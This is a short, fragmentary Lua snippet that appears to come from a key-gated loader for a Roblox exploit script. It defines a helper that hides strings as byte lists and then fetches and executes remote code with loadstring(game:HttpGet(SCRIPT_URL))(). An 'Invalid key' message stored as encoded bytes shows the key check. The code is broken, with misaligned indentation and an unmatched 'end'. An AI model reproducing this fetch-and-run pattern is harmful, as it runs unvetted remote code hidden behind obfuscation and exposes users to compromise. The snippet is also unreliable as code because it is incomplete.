local function _obf(s)
    local b = {}
    for i = 1, #s do b[#b+1] = tostring(s:byte(i)) end
    return "string.char(" .. table.concat(b, ",") .. ")"
end

        loadstring(game:HttpGet(SCRIPT_URL))()

        StatusLabel.Text = string.char(73,110,118,97,108,105,100,32,107,101,121,46,32,84,114,121,32,97,103,97,105,110,46)
        InputBox.Text = string.char(32):rep(0)

end
